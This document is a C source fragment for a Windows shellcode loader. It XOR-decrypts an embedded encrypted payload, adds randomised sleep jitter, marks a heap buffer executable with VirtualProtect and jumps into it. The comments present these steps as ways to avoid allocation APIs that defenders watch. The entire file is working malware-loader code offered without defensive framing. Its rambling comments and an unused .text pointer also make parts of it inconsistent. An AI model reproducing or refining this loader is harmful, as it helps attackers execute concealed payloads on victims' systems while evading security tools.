// This function pointer sits in .text right after the shellcode
// It will point to the shellcode after decryption
__attribute__((section(".text"))) void (*shellcode_entry)() = NULL;

// Decrypt the shellcode buffer in-place
void Decrypt(BYTE* buf, SIZE_T len) {
    for (SIZE_T i = 0; i < len; i++) buf[i] ^= 0xAA;
}

// Sleep jitter using kernel32 Sleep (legitimate call)
void SleepJitter(DWORD ms) {
    DWORD j = ms + (rand() % (ms / 2)) - (ms / 4);
    if (j < 10) j = 10;
    Sleep(j);
}

int main() {
    srand((unsigned int)time(NULL) ^ GetCurrentProcessId());
    
    // The shellcode is already in .text section (executable memory)
    // Just decrypt it in-place - no VirtualAlloc, no VirtualProtect needed
    // because .text is already RX
    
    // First we need to make .text writable temporarily to decrypt
    // But to avoid VirtualProtect entirely, we decrypt into a stack buffer
    // then copy into the .text section via a different approach
    
    // SIMPLEST approach: decrypt into allocated memory (HeapAlloc, not VirtualAlloc)
    // and then the shellcode is already in executable .text segment
    
    // Actually the cleanest: allocate a buffer, decrypt there, 
    // then copy to .text region (which is already executable)
    
    // Wait - .text might not be writable. Let's use a simple approach:
    // Allocate on heap, decrypt, then use WriteProcessMemory on ourselves
    
    SIZE_T len = sizeof(encrypted_shellcode);
    
    // Decrypt into a temporary stack buffer
    BYTE temp[1024]; // adjust if shellcode is larger
    if (len > sizeof(temp)) return 1;
    
    for (SIZE_T i = 0; i < len; i++) {
        temp[i] = encrypted_shellcode[i] ^ 0xAA;
    }
    
    SleepJitter(100);
    
    // Write the decrypted shellcode back to the .text section
    // using WriteProcessMemory on our own process
    // This requires PAGE_READWRITE on .text - but we can use VirtualProtect briefly
    
    // Actually, the cleanest approach: use memcpy to a HEAP buffer,
    // then mark that as executable using VirtualProtect
    
    // Let me use the simplest possible path:
    BYTE* buf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, len);
    if (!buf) return 1;
    
    memcpy(buf, temp, len);
    
    // Mark as executable using VirtualProtect
    DWORD old;
    VirtualProtect(buf, len, PAGE_EXECUTE_READ, &old);
    
    SleepJitter(50);
    
    // Execute
    ((void(*)())buf)();
    
    HeapFree(GetProcessHeap(), 0, buf);
    return 0;
}
